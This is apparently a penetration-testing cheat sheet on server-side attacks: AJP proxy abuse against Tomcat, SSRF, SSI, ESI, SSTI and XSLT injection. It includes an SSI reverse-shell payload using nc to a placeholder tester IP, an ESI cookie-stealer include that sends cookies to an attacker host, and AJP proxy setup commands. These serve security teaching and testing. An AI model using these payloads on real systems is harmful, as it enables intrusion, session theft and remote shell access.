# <a id="top-of-page"></a> Server-side Attacks

### Links

- [Attacking Proxy Apps (Nginx/Apache/AJP)](#att-proxy)
- [Server-Side Request Forgery (SSRF)](#ssrf)
- [Server-Side Includes (SSI) Injection](#ssi)
- [Edge-Side Includes (ESI) Injection](#esi)
- [Server-Side Template Injections (SSTI)](#ssti)
- [Extensible Stylesheet Language Transformation Server-Side Injections (XSLT)](#xslt)

# <a id="att-proxy"></a> Attacking Proxy Apps

Before an attack, an understanding of what [AJP]() (or JK) is required. It is an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible but proxy the request to Tomcat for Tomcat-related content.

- AJP proxy ports are on (8009 TCP)
- Can potentially be used to access hidden Tomcat Manager
- Is a binary protocol
- Can be configured to work with Nginx or Apache using AJP modules

**_Attack Steps for Nginx Rev Proxy_**

- Download Nginx source code
- Download the required module
- Compile Nginx source code with ajp_module
- Create a config file pointing to AJP port

_Download Nginx Source Code_

```
Anon4Now@attacker[/attacker]$ wget https://nginx.org/download/nginx-1.21.3.tar.gz
Anon4Now@attacker[/attacker]$ tar -xzvf nginx-1.21.3.tar.gz
```

_Compile Nginx source code with ajp module_

```
Anon4Now@attacker[/attacker]$ git clone https://github.com/dvershinin/nginx_ajp_module.git
Anon4Now@attacker[/attacker]$ cd nginx-1.21.3
Anon4Now@attacker[/attacker]$ sudo apt install libpcre3-dev
Anon4Now@attacker[/attacker]$ ./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
Anon4Now@attacker[/attacker]$ make
Anon4Now@attacker[/attacker]$ sudo make install
Anon4Now@attacker[/attacker]$ nginx -V
```

Comment out the entire server block and append the following lines inside the http block in /etc/nginx/conf/nginx.conf.

_Point to the AJP port_

```
upstream tomcats {
	server <TARGET_SERVER>:8009;
	keepalive 10;
	}
server {
	listen 80;
	location / {
		ajp_keep_conn on;
		ajp_pass tomcats;
	}
}
```

Start Nginx and check if everything is working correctly by issuing a cURL request to your local host.

```
Anon4Now@attacker[/attacker]$ sudo nginx
Anon4Now@attacker[/attacker]$ curl http://127.0.0.1:80
```

**_Attack Steps for Apache Rev Proxy_**

- Install the libapache2-mod-jk package
- Enable the module
- Create the config file point to the target AJP-Proxy port

_Required Commands_

```
Anon4Now@attacker[/attacker]$ sudo apt install libapache2-mod-jk
Anon4Now@attacker[/attacker]$ sudo a2enmod proxy_ajp
Anon4Now@attacker[/attacker]$ sudo a2enmod proxy_http
Anon4Now@attacker[/attacker]$ export TARGET="<TARGET_IP>"
Anon4Now@attacker[/attacker]$ echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
Anon4Now@attacker[/attacker]$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
Anon4Now@attacker[/attacker]$ sudo systemctl start apache2
```

_Access Hidden Tomcat page_

```
Anon4Now@attacker[/attacker]$ curl http://127.0.0.1
```

[Back to top](#top-of-page)

</br>

# <a id="ssrf"></a> SSRF

SSRF attacks are used to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, the attacker usually needs to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:

- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution

SSRF vulnerabilities are generally found in applications that fetch remote resources. Things to look for:

- Parts of HTTP requests, including URLs
- File imports such as HTML, PDFs, images, etc.
- Remote server connections to fetch data
- API specification imports
- Dashboards including ping and similar functionalities to check server statuses

It is difficult to demonstrate SSRF vulnerablilities via text, but the main attack points should be URL query params & referer headers. To be able to read, write, or execute on a target via SSRF, there is a need to understand the technologies being used by the web app.

For example if the web app is using Werkzeug/2.0.2 Python, it may be possible to use the file, http, and ftp schemas to read files on the target.

There are also Blind-SSRF and Time-base SSRF attacks possible, research and testing will need to be conducted to determine whether these vulnerabilities exist.

[Back to top](#top-of-page)

</br>

# <a id="ssi"></a> SSI

Server-side includes (SSI) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are:

```
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```

The use of SSI on a web application can be identified by checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives. Testing for this vulnerability should be done through input fields, (keep in mind there can be blind SSI) and if done correctly can reveal info to RCE on the web app/host.

_Example Rev Shell_

```
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

[Back to top](#top-of-page)

</br>

# <a id="top-of-page"></a> ESI

ESI is an XML-based markup language used to tackle performance issues by enabling heavy caching of Web content. ESI allows for dynamic web content assembly at the edge of the network (Content Delivery Network, User's Browser, or Reverse Proxy) by instructing the page processor what needs to be done to complete page assembly through ESI element tags (XML tags). ESI tags are used to instruct an HTTP surrogate (reverse-proxy, caching server, etc.) to fetch additional information regarding a web page with an already cached template. This information may come from another server before rendering the web page to the end-user. ESI injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin and will parse legit & malicious tags.

Although identification of this vul can be done by looking for _Surrogate-Control: content="ESI/1.0"_ in the response headers, this attack will likely be blind. Below are ESI tags for HTTP requests that will check if any proxy is parsing requests and if ESI injection is possible.

```
// Basic detection
<esi: include src=http://<PENTESTER IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```

In some cases, RCE is possible when the application processing ESI directives supports XSLT, a dynamic language used to transform XML files. In that case, the attacker can pass dca=xslt to the payload. The XML file selected will be processed with the possibility of performing XML External Entity Injection Attacks (XXE) with some limitations.

A table below will provide data on the types of attacks that can be performed against different ESI-capable software (depending on functionality):

- Includes: Supports the <esi:includes> directive
- Vars: Supports the <esi:vars> directive. Useful for bypassing XSS Filters
- Cookie: Document cookies are accessible to the ESI engine
- Upstream Headers Required: Surrogate applications will not process ESI statements unless the upstream application provides the headers
- Host Allowlist: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts

| **Software**                 | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| ---------------------------- | ------------ | -------- | ----------- | ----------------------------- | ------------------ |
| Squid3                       | Yes          | Yes      | Yes         | Yes                           | No                 |
| Varnish Cache                | Yes          | No       | No          | Yes                           | Yes                |
| Fastly                       | Yes          | No       | No          | No                            | Yes                |
| Akamai ESI Test Server (ETS) | Yes          | Yes      | Yes         | No                            | No                 |
| NodeJS esi                   | Yes          | Yes      | Yes         | No                            | No                 |
| NodeJS nodesi                | Yes          | No       | No          | No                            | Optional           |

[Back to top](#top-of-page)

</br>

# <a id="ssti"></a> SSTI

SSTI vulnerabilities can be detected by injecting different tags in the inputs attackers control to see if they are evaluated in the response. Attackers don't necessarily need to see the injected data reflected in the response received, as sometimes it is just evaluated on different pages (blind injection).

The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example:

```
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
...
```

The goal would be to look for "49" in the response from the server to see if the mathmatical expression was eval'd.

The most difficult way to identify SSTI is to fuzz the template by injecting combinations of special characters used in template expressions. These characters include ${{<%[%'"}}%\. If an exception is caused, this means the attacker has some control over what the server interprets in terms of template expressions. Tools such as [Tplmap](https://github.com/epinna/tplmap) and J2EE (Burp Pro) can be used to automatically test for SSTI vulnerabilities.

A full list of SSTI payloads can be found at PayloadAllTheThings or HackTricks.

[Back to top](#top-of-page)

</br>

# <a id="xslt"></a> XSLT

Extensible Stylesheet Language Transformations (XSLT) is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. Extensible Stylesheet Language Transformations Server-Side Injection can occur when arbitrary XSLT file upload is possible or when an application generates the XSL Transformationâ€™s XML document dynamically using unvalidated input from the user.

Depending on the case, XSLT uses built-in functions and the XPATH language to transform a document either in the browser or the server. Extensible Stylesheet Language Transformations are present in some web applications as standalone functionality, SSI engines, and databases like Oracle. At the time of writing, there are 3 (1, 2, 3) XSLT versions. Version 1 is the least interesting from an attacker's perspective due to the limited built-in functionality. The most used XSLT-related projects are LibXSLT, Xalan, and Saxon. To exploit XSLT Injections, the attacker needs to store malicious tags on the server-side and access that content.

- [XSLT Injections](https://blog.pentesteracademy.com/xslt-injections-for-dummies-a0cfbe0c42f5)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations)
